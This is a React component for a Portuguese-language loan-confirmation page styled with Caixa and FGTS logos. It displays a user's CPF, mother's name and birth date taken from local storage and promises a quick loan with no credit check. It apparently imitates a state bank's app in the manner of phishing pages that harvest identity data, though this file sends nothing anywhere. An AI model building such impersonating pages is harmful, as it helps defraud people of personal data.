
import React, { useEffect, useState } from 'react';
import { ArrowRight, DollarSign, BarChart3, Calendar, Home, HelpCircle, MoreHorizontal, Check } from 'lucide-react';
import CaixaLogo from '@/components/CaixaLogo';
import FGTSLogo from '@/components/FGTSLogo';
import { Button } from '@/components/ui/button';
import { useNavigate } from 'react-router-dom';
import { useIsMobile } from '@/hooks/use-mobile';

interface UserData {
  DADOS: {
    cpf: string;
    nome: string;
    nome_mae: string;
    data_nascimento: string;
    sexo: string;
  }
}

const LoanConfirmation = () => {
  const [userData, setUserData] = useState<UserData | null>(null);
  const navigate = useNavigate();
  const isMobile = useIsMobile();
  
  useEffect(() => {
    // Try to get user data from localStorage
    const userDataString = localStorage.getItem('userData');
    
    if (userDataString) {
      try {
        const parsedData: UserData = JSON.parse(userDataString);
        setUserData(parsedData);
      } catch (error) {
        console.error("Error parsing user data:", error);
        navigate('/dashboard');
      }
    } else {
      // No user data available, redirect back to dashboard
      navigate('/dashboard');
    }
  }, [navigate]);

  // Format date from yyyy-mm-dd to dd/mm/yyyy
  const formatDate = (dateString: string): string => {
    if (!dateString) return '';
    
    const parts = dateString.split('-');
    if (parts.length !== 3) return dateString;
    
    return `${parts[2]}/${parts[1]}/${parts[0]}`;
  };

  // Format CPF: 12345678900 -> 123.456.789-00
  const formatCPF = (cpf: string): string => {
    if (!cpf || cpf.length !== 11) return cpf;
    
    return `${cpf.substring(0, 3)}.${cpf.substring(3, 6)}.${cpf.substring(6, 9)}-${cpf.substring(9, 11)}`;
  };

  const handleConfirm = () => {
    // Here you would handle the loan application confirmation
    // For now, just go back to dashboard
    navigate('/dashboard');
  };

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
      {/* Header */}
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
        <CaixaLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
      </div>

      {/* Title */}
      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Confirmação de Dados</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Verifique se seus dados estão corretos para prosseguir com o empréstimo
        </div>
      </div>

      {/* Main content */}
      <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
        <div className="p-4 sm:p-6">
          {/* User data confirmation */}
          <div className="bg-white border border-gray-200 rounded-lg p-5 mb-6 shadow-sm">
            <h2 className="text-[#005CA9] text-xl font-semibold mb-4">Dados Pessoais</h2>
            
            {userData ? (
              <div className="space-y-4">
                <div>
                  <div className="text-gray-500 text-sm">Nome Completo</div>
                  <div className="font-medium text-gray-900">{userData.DADOS.nome}</div>
                </div>
                
                <div>
                  <div className="text-gray-500 text-sm">CPF</div>
                  <div className="font-medium text-gray-900">{formatCPF(userData.DADOS.cpf)}</div>
                </div>
                
                <div>
                  <div className="text-gray-500 text-sm">Nome da Mãe</div>
                  <div className="font-medium text-gray-900">{userData.DADOS.nome_mae}</div>
                </div>
                
                <div>
                  <div className="text-gray-500 text-sm">Data de Nascimento</div>
                  <div className="font-medium text-gray-900">{formatDate(userData.DADOS.data_nascimento)}</div>
                </div>
                
                <div className="mt-6">
                  <Button 
                    className="w-full bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-6 rounded-full"
                    onClick={handleConfirm}
                  >
                    CONFIRMAR DADOS
                  </Button>
                </div>
              </div>
            ) : (
              <div className="text-center py-4 text-gray-500">Carregando dados...</div>
            )}
          </div>
          
          {/* Loan info */}
          <div className="bg-[#f8f9fa] rounded-lg p-4 mb-4">
            <div className="text-[#005CA9] font-semibold mb-2">Informações do Empréstimo</div>
            <div className="flex justify-between items-center text-sm text-gray-600 mb-2">
              <span>Valor disponível:</span>
              <span className="font-bold">Até R$ 5.900,00</span>
            </div>
            <div className="flex justify-between items-center text-sm text-gray-600 mb-2">
              <span>Parcelas:</span>
              <span className="font-bold">Até 72x</span>
            </div>
            <div className="flex justify-between items-center text-sm text-gray-600">
              <span>Taxa:</span>
              <span className="font-bold">A partir de 1,79% a.m.</span>
            </div>
          </div>
          
          {/* Benefits */}
          <div className="mb-20">
            <div className="text-[#005CA9] font-semibold mb-3">Vantagens</div>
            <div className="flex items-start space-x-2 mb-2">
              <Check size={16} className="text-green-500 mt-0.5 flex-shrink-0" />
              <span className="text-sm text-gray-600">Crédito fácil e rápido</span>
            </div>
            <div className="flex items-start space-x-2 mb-2">
              <Check size={16} className="text-green-500 mt-0.5 flex-shrink-0" />
              <span className="text-sm text-gray-600">Sem consulta ao SPC/Serasa</span>
            </div>
            <div className="flex items-start space-x-2">
              <Check size={16} className="text-green-500 mt-0.5 flex-shrink-0" />
              <span className="text-sm text-gray-600">Dinheiro na conta em até 24 horas</span>
            </div>
          </div>
        </div>
        
        {/* Bottom Navigation */}
        <div className="fixed bottom-0 w-full bg-white border-t border-gray-200">
          <div className="flex justify-around items-center py-3">
            <div className="flex flex-col items-center text-gray-500">
              <Home size={24} />
              <span className="text-xs mt-1">Principal</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <BarChart3 size={24} />
              <span className="text-xs mt-1">Meu FGTS</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
                <DollarSign size={24} className="text-white" />
              </div>
              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <HelpCircle size={24} />
              <span className="text-xs mt-1">Ajuda</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <MoreHorizontal size={24} />
              <span className="text-xs mt-1">Mais</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoanConfirmation;
